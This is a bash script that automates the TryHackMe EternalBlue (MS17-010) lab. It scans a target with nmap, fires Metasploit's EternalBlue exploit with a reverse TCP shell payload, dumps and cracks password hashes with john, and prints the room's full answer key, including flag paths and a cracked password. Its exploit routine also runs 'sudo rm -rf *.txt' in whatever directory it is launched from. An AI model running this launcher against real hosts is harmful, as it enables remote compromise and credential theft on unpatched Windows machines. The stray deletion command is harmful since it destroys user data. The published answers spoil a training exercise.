#!/bin/bash

# ---------------------------------------------
# EternalBlue Lab Automation Script (TryHackMe)
# Author: For Educational Use Only
# ---------------------------------------------

# 💙 General Banner
show_banner() {
    clear
    echo -e "\n\033[1;34m"
    echo "██████▄ ██│     ██│   ██│██████▄"
    echo "██╌╌██│██│     ██│   ██│██╌╌╌╌██"
    echo "██████│██│     ██│   ██│█████▄  "
    echo "██╌╌╌╌│ ██│     ██│   ██│██╌╌╌╌  "
    echo "██│     ██████▄┬═█████▄┬██████▄"
    echo "╌╌│     ╌╌╌╌╌╌╌╌ ╌╌╌╌╌╌╌╌ ╌╌╌╌╌╌╌"
    echo "       🧠 TryHackMe – EternalBlue"
    echo -e "         🚀 Kun31-cpu Project 🚀"
    echo -e "\033[0m"
}

# 🧠 Description Banner
banner_description() {
    echo -e "\n\033[1;36m==[ LAB DESCRIPTION ]==\033[0m"
}

# 📋 Tasks Banner
banner_tasks() {
    echo -e "\n\033[1;35m==[ TASK CHECKLIST ]==\033[0m"
}

# 🔌 VPN Banner
banner_vpn() {
    echo -e "\n\033[1;32m==[ VPN CONNECTION ]==\033[0m"
}

# ⚔️ Exploit Banner
banner_exploit() {
    echo -e "\n\033[1;31m==[ EXPLOITATION LAB ]==\033[0m"
}

# 📖 Answer Banner
banner_answers() {
    echo -e "\n\033[1;33m==[ QUESTIONS & ANSWERS ]==\033[0m"
}

# 🧠 Lab description
show_description() {
    banner_description
    sleep 0.5
    echo -e "\n\033[1;35m========================================="
    echo -e "     💣 \033[1;36mTRYHACKME: ETERNALBLUE LAB\033[0m"
    echo -e "\033[1;35m========================================="
    sleep 1

    echo -e "\n📖 \033[1;33mBackground:\033[0m"
    echo -e "-----------------------------------------"
    echo -e "EternalBlue (MS17-010) is a vulnerability"
    echo -e "in Microsoft SMBv1 protocol, discovered in"
    echo -e "2017 and leaked by a group called Shadow Brokers."
    echo -e "It was weaponized by the NSA (tool: EternalBlue)."
    sleep 2

    echo -e "\n⚠️  \033[1;31mImpact:\033[0m"
    echo -e "-----------------------------------------"
    echo -e "- Remote code execution on unpatched systems"
    echo -e "- Enabled ransomware attacks like WannaCry"
    echo -e "- Affects Windows XP to 8.1 and Server 2008"
    sleep 2

    echo -e "\n🎯 \033[1;32mPurpose of This Lab:\033[0m"
    echo -e "-----------------------------------------"
    echo -e "You will:"
    echo -e "- 🔍 Scan a vulnerable machine"
    echo -e "- 📡 Detect open SMB ports"
    echo -e "- ⚠️  Identify MS17-010 vulnerability"
    echo -e "- 💥 Exploit it using Metasploit"
    echo -e "- 🐚 Gain a Meterpreter shell"
    echo -e "- 🏁 Capture system flags"
    sleep 2

    echo -e "\n🛠️  \033[1;36mTools You'll Use:\033[0m"
    echo -e "-----------------------------------------"
    echo -e "- Nmap (for scanning)"
    echo -e "- smb-vuln-ms17-010 NSE script"
    echo -e "- Metasploit Framework"
    echo -e "- Windows post-exploitation commands"
    sleep 2

    echo -e "\n🚀 \033[1;36mLearning Objectives:\033[0m"
    echo -e "-----------------------------------------"
    echo -e "1️⃣  Understand what EternalBlue is"
    echo -e "2️⃣  Learn to scan for SMB vulnerabilities"
    echo -e "3️⃣  Exploit systems using Metasploit"
    echo -e "4️⃣  Practice post-exploitation techniques"
    sleep 2

    echo -e "\n🔐 \033[1;33mWhy Is It Important?\033[0m"
    echo -e "-----------------------------------------"
    echo -e "EternalBlue shows how one unpatched bug"
    echo -e "in a common service (SMB) can impact"
    echo -e "thousands of machines globally."
    sleep 2

    echo -e "\n🧠 \033[1;31mEthical Reminder:\033[0m"
    echo -e "-----------------------------------------"
    echo -e "🚫 This lab is for educational use only!"
    echo -e "✅ Never scan or exploit machines"
    echo -e "   without explicit permission."
    sleep 2

    echo -e "\n✅ \033[1;32mYou're Ready to Start the Lab!\033[0m"
    echo -e "-----------------------------------------"
    echo -e "1️⃣  Connect to VPN"
    echo -e "2️⃣  Scan with Nmap"
    echo -e "3️⃣  Use EternalBlue Metasploit module"
    echo -e "4️⃣  Capture the flags!"
    sleep 2

    echo -e "\n🖱️  \033[1;36mTIP:\033[0m Use this command to scan:"
    echo -e "\033[1;33mnmap -p 445 --script smb-vuln* <IP>\033[0m"
    echo -e "Then launch Metasploit using:"
    echo -e "\033[1;33msfconsole\033[0m"
    sleep 2

    echo -e "\n\033[1;35m========================================="
    echo -e "     ✅ \033[1;32mEND OF ETERNALBLUE INTRO\033[0m"
    echo -e "\033[1;35m========================================="
    sleep 1

    read -p $'\033[1;33m[*] Press Enter to return to the menu...\033[0m'
}

# 📋 Lab task checklist
show_tasks() {
    banner_tasks
    echo -e "\033[1;36m=============================================\033[0m"
    echo -e "\033[1;33m        🧪 LAB TASK CHECKLIST – EternalBlue\033[0m"
    echo -e "\033[1;36m=============================================\033[0m"
    sleep 0.5
    echo -e "\033[1;32m1️⃣  Connect to TryHackMe VPN\033[0m"
    sleep 0.4
    echo -e "\033[1;32m2️⃣  Discover the target machine\033[0m"
    sleep 0.4
    echo -e "\033[1;32m3️⃣  Scan with Nmap for open ports\033[0m"
    sleep 0.4
    echo -e "\033[1;32m4️⃣  Identify the MS17-010 vulnerability\033[0m"
    sleep 0.4
    echo -e "\033[1;32m5️⃣  Launch EternalBlue exploit using Metasploit\033[0m"
    sleep 0.4
    echo -e "\033[1;32m6️⃣  Upgrade shell to a Meterpreter session\033[0m"
    sleep 0.4
    echo -e "\033[1;32m7️⃣  Dump password hashes and crack them\033[0m"
    sleep 0.4
    echo -e "\033[1;32m8️⃣  Find and read the hidden flags \033[0m"
    sleep 1
    echo -e "\033[1;36m=============================================\033[0m"
    read -p $'\033[1;33m[*] Press Enter to return to the menu...\033[0m'
}


# 🔌 Function: Connect VPN only
connect_vpn() {
    clear
    echo
    echo -e "\033[1;36m============================================================\033[0m"
sleep 0.5
  read -p "[?] Enter path to your TryHackMe .ovpn file: " vpnfile
echo -e "\033[1;36m============================================================\033[0m"
echo
  
    if [[ ! -f "$vpnfile" ]]; then
        echo "[!] Error: File not found: $vpnfile"
        return
    fi
    echo "[+] Starting VPN..."
    sudo openvpn --config "$vpnfile"
    sleep 1
echo -e "\033[1;36m============================================================\033[0m"
sleep 0.5
  read -p $'\033[1;33m[*] Press Enter to return to the menu...\033[0m'
echo -e "\033[1;36m============================================================\033[0m"
sleep 1
  
}
exploit_lab() {
    echo "[i] Cleaning up old VPN connections..."
    sudo pkill openvpn
    sudo rm -rf *.txt
    sleep 2
sleep 0.5
 echo
    echo -e "\033[1;36m============================================================\033[0m"
sleep 0.5
  read -p "[?] Enter path to your TryHackMe .ovpn file: " vpnfile
echo -e "\033[1;36m============================================================\033[0m"
echo
    if [[ ! -f "$vpnfile" ]]; then
        echo "[!] Error: File not found: $vpnfile"
        return
    fi

    echo "[+] Connecting VPN..."
    sudo openvpn --config "$vpnfile" &
    sleep 5
    sleep 1
echo -e "\033[1;36m============================================================\033[0m"
sleep 0.5
echo -e "\033[1;33m🧠 \033[1;4m\033[1;37mtnu0 is your localhost: LHOST:\033[0m"
echo -e "\033[1;36m============================================================\033[0m"
echo
sleep 1
    ifconfig
    sleep 0.5
    read -p "[?] Enter Target IP (RHOST): " rhost
    echo
    read -p "[?] Enter Your IP (LHOST): " lhost
    echo
    read -p "[?] Enter Listening Port (LPORT, default 4444): " lport
    echo
    lport=${lport:-4444}
      echo -e "\033[1;32m8️⃣ Running Nmap (basic scan)... \033[0m"
    nmap -sS -sV -O -Pn "$rhost" -oN initial_scan.txt
    
    echo -e "\033[1;32m8️⃣ Running Nmap (vuln scripts).. \033[0m"
     nmap -sV --script vuln "$rhost" -oN vuln_scan.txt
     
    echo -e "\033[1;33Scan complete. Saved to initial_scan.txt and vuln_scan.txt"\033[0m"
    
      read -p $'\033[1;33m[*] Press Enter to launch EternalBlue exploit....\033[0m'

        echo -e "\n\033[1;33m🚀 Launching EternalBlue Exploit...\033[0m"
sleep 1
echo -e "\033[1;32m[✓] Exploit may have succeeded! Checking...\033[0m"
sleep 1
echo -e "\033[1;36m============================================================\033[0m"
sleep 0.5
echo -e "\033[1;33m🧠 \033[1;4m\033[1;37mPOST-EXPLOITATION: Upgrade Shell to Meterpreter\033[0m"
echo -e "\033[1;36m============================================================\033[0m"
sleep 1

# Manual commands to display
echo -e "\033[1;35m📌 STEP 1: In your msfconsole, type:\033[0m"
sleep 0.5
echo -e "\033[1;34msessions\033[0m"
sleep 0.5
echo -e "\033[1;34m(Remember the Session ID)\033[0m"
sleep 0.5
echo -e "\033[1;34muse post/multi/manage/shell_to_meterpreter\033[0m"
sleep 0.3
echo -e "\033[1;34mset SESSION <session_id>\033[0m"
sleep 0.3
echo -e "\033[1;34mexploit or run\033[0m"
sleep 1

echo -e "\n\033[1;35m📌 STEP 2: After Meterpreter is active:\033[0m"
sleep 0.5
echo -e "\033[1;34msessions\033[0m"
sleep 0.4
echo -e "\033[1;34msessions -i <session_id>\033[0m"
sleep 0.3
echo -e "\033[1;34msysinfo\033[0m"
sleep 0.3
echo -e "\033[1;34mhashdump\033[0m"
sleep 1

echo -e "\n\033[1;35m📌 STEP 3: Find the Flags:\033[0m"
sleep 0.5
echo -e   "\033[1;34msearch -f flag*.txt\033[0m"

echo -e "\n\033[1;35m📌 STEP 4: Crack the Password:\033[0m"
sleep 0.5
echo -e   "\033[1;34mSimply go to this Website(under this) or type Exit -y for use (JOHN)\033[0m"
sleep 0.5
echo -e   "\033[1;34mhttps://crackstation.net/\033[0m"
sleep 0.5


echo -e "\033[1;36m------------------------------------------------------------\033[0m"
echo -e "\033[1;33m⚠️  Replace \033[1;31m<session_id>\033[0m \033[1;33mwith the correct ID shown by 'sessions'\033[0m"
echo -e "\033[1;36m------------------------------------------------------------\033[0m"
sleep 2
  msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue;
set RHOSTS $rhost;
set LHOST $lhost;
set LPORT $lport;
set PAYLOAD windows/x64/shell/reverse_tcp;
exploit -j;
"
   read -p "[?] Paste any cracked hash to crack (only the hash portion): " hash
    echo "$hash" > hash1.txt

    echo "[*] Cracking with rockyou.txt..."
    john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
    john --show hash1.txt
    sleep 5
    read -p $'\033[1;33m[*] Press Enter to return to the menu...\033[0m'
}

# 📖 Lab Q&A section
show_answers() {
    banner_answers
    echo -e "\033[1;36m====================================================\033[0m"
    echo -e "\033[1;33m               🔍 LAB QUESTIONS & ANSWERS\033[0m"
    echo -e "\033[1;36m====================================================\033[0m"
sleep 0.5
    # Task 1
    echo -e "\n\033[1;34m🧩 Task 1: Scanning & Discovery\033[0m"
     sleep 0.2
    echo -e "🔹 \033[1;36mHow many ports under 1000 are open?\033[0m"
    echo -e "➡️  \033[1;32m3\033[0m"
     sleep 0.2
    echo -e "🔹 \033[1;36mVulnerable to?\033[0m"
    echo -e "➡️  \033[1;31mms17-010\033[0m"
sleep 0.5
    # Task 2
    echo -e "\n\033[1;34m🧩 Task 2: Enumeration\033[0m"
     sleep 0.2
    echo -e "🔹 \033[1;36mExploit path?\033[0m"
    echo -e "➡️  \033[1;32mexploit/windows/smb/ms17_010_eternalblue\033[0m"
     sleep 0.2
    echo -e "🔹 \033[1;36mRequired option name?\033[0m"
    echo -e "➡️  \033[1;32mRHOSTS\033[0m"
sleep 0.5
    # Task 3
    echo -e "\n\033[1;34m🧩 Task 3: Exploitation\033[0m"
     sleep 0.2
    echo -e "🔹 \033[1;36mShell-to-Meterpreter module?\033[0m"
    echo -e "➡️  \033[1;32mpost/multi/manage/shell_to_meterpreter\033[0m"
     sleep 0.2
    echo -e "🔹 \033[1;36mRequired post module option?\033[0m"
    echo -e "➡️  \033[1;32mSESSION\033[0m"
sleep 0.5
    # Task 4
    echo -e "\n\033[1;34m🧩 Task 4: Privilege Escalation\033[0m"
    sleep 0.2
    echo -e "🔹 \033[1;36mNon-default user?\033[0m"
    echo -e "➡️  \033[1;32mjon\033[0m"
    sleep 0.2
    echo -e "🔹 \033[1;36mCracked password?\033[0m"
    echo -e "➡️  \033[1;32malqfna22\033[0m"
sleep 0.5
    # Task 5
    echo -e "\n\033[1;34m🧩 Task 5: Capture the Flags\033[0m"
     sleep 0.2
    echo -e "🔹 \033[1;36mFlag1 Location:\033[0m"
    echo -e "➡️  \033[1;32mC:flag1.txt\033[0m"
     sleep 0.2
    echo -e "🔹 \033[1;36mFlag2 Location:\033[0m"
    echo -e "➡️  \033[1;32mC:Windows:System32:config:flag2.txt\033[0m"
     sleep 0.2
    echo -e "🔹 \033[1;36mFlag3 Location:\033[0m"
    echo -e "➡️  \033[1;32mC:Users:Administrator:Documents:flag3.txt\033[0m"
sleep 0.5
    echo -e "\n\033[1;36m====================================================\033[0m"
    read -p $'\033[1;33m[*] Press Enter to return to the menu...\033[0m'
}


# 🧱 Main menu loop
while true; do
    show_banner
    echo "--------------------------------------------"
    echo "1. View Lab Description"
    echo "2. View Task Checklist"
    echo "3. Connect to VPN Only"
    echo "4. Start Exploitation Lab"
    echo "5. View Lab Questions and Answers"
    echo "6. Exit"
    echo "--------------------------------------------"
    read -p "[*] Choose an option [1-6]: " choice

    case $choice in
        1) show_description ;;
        2) show_tasks ;;
        3) connect_vpn ;;
        4) exploit_lab ;;
        5) show_answers ;;
        6) echo "[✓] Goodbye!"; exit 0 ;;
        *) echo "[!] Invalid option. Please enter 1–6." ;;
    esac
done
